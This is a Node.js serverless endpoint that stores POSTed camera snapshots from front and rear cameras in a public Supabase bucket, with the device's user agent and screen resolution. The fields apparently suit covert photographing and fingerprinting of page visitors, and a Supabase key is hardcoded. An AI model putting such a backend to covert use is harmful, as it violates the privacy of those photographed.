require('dotenv').config();
const { createClient } = require('@supabase/supabase-js');
const { randomUUID } = require('crypto');

const PROJECT_ORIGIN = 'https://qakdwubbzrkiojwgcyry.supabase.co';
const configuredUrl = (process.env.SUPABASE_URL || PROJECT_ORIGIN).trim();
const parsedUrl = new URL(configuredUrl);
if (parsedUrl.origin !== PROJECT_ORIGIN) {
    throw new Error('SUPABASE_URL aponta para outro projeto; confira a variável na Vercel.');
}
if (parsedUrl.pathname !== '/' || parsedUrl.search || parsedUrl.hash) {
    console.warn('SUPABASE_URL contém caminho ou parâmetros extras; usando apenas a URL base do projeto.');
}
const SUPABASE_URL = parsedUrl.origin;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFha2R3dWJienJraW9qd2djeXJ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI1MDcwNTEsImV4cCI6MjEwODA4MzA1MX0.YRRpbJiwTZ4JVmCF3E-tq4FwJOE96rhAVq0pOav7AVA';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
const BUCKET_NAME = 'capturas';

module.exports = async function captura(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método não permitido' });
    }

    try {
        const { facingMode, image, userAgent, screenRes, captureIndex } = req.body || {};
        
        // Validação de Payload
        if (typeof image !== 'string' || !/^data:image\/jpeg;base64,[A-Za-z0-9+/]+={0,2}$/.test(image)) {
            return res.status(400).json({ error: 'Imagem JPEG inválida' });
        }

        const binaryData = Buffer.from(image.slice('data:image/jpeg;base64,'.length), 'base64');
        if (!binaryData.length) return res.status(400).json({ error: 'Imagem vazia' });

        // Log de Auditoria: Mostra qual câmera foi capturada
        console.log(`[CAPTURA] #${captureIndex ?? 'N/A'} | Câmera: ${facingMode} | Tamanho: ${(binaryData.length / 1024).toFixed(1)}KB`);

        const fileName = `cap_${Date.now()}_${randomUUID()}.jpg`;
        const { error: uploadError } = await supabase.storage
            .from(BUCKET_NAME)
            .upload(fileName, binaryData, { contentType: 'image/jpeg' });

        if (uploadError) {
            console.error('Falha no Supabase Storage:', uploadError);
            return res.status(502).json({
                error: 'O Supabase recusou o envio da imagem',
                stage: 'storage',
                detail: uploadError.message
            });
        }

        const { data: { publicUrl } } = supabase.storage
            .from(BUCKET_NAME)
            .getPublicUrl(fileName);

        // Insere metadados no banco
        const { error: insertError } = await supabase.from('metadados').insert({
            timestamp: new Date().toISOString(),
            facing_mode: facingMode,
            user_agent: userAgent,
            screen_res: screenRes,
            image_url: publicUrl
        });

        if (insertError) {
            console.error('Imagem enviada, mas falha ao salvar metadados:', insertError);
            return res.status(502).json({
                error: 'Imagem enviada, mas os metadados não foram salvos',
                stage: 'database',
                detail: insertError.message,
                fileName
            });
        }

        return res.status(200).json({ success: true, imageUrl: publicUrl });
    } catch (err) {
        console.error('Erro no /api/captura:', err);
        return res.status(500).json({ error: err.message });
    }
};
